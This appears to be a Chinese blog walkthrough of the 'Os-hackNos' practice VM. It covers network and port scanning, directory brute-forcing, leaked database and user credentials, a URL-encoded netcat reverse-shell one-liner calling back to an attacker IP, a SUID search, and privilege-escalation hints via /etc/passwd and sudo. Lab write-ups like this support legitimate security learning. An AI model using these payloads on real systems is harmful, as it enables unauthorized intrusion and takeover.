---
title: os-hack
date: 2020-11-28 09:23:30
tags: 靶机渗透
---

# Os-hackNos

# 一 信息收集

```
netdiscover -i eth0 -r 10.10.10.0/24 扫描ip
nmap -sP 192.168.43.0/24  扫描开放的端口
```

```
使用“-sP”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。
```

```
开始对目标进行扫描nmap -p 10.10.10.0 -sV -oA Os-hackNos-1
```

```
namp  -Pn -sV +ip 基础扫描
加一个 -O
-A 路由信息 服务器的详细信息
-v 扫描过程 
-p 后面可以加端口服务的范围
-F 快速扫描
-iL 导入文本文件扫描 批量
-oN 保存文本
-oX 保存 xml文件
--open 只显示开放端口
```

使用gobuster 进行利用`usr/share/wordlists/dirbuster`的字典来测试

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'cuppa',
      'username' => 'cuppauser',
      'password' => 'Akrn@4514',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f%7c/bin/sh+-i+2%3e%261%7cnc+192.168.43.16+1234+%3e/tmp/f
```

```
james:Hacker@4514
```

```
find / -perm -u=s -type f 2>/dev/null
```

寻找带有特权的文件。想办法替换/etc/passwd，就可以实现更改密码了。

超强小马软件：https://blog.csdn.net/qq_45521281/article/details/106587791

```
sudo -l 可能发现一些命令可以执行root权限，而且没有密码要求哦。
```

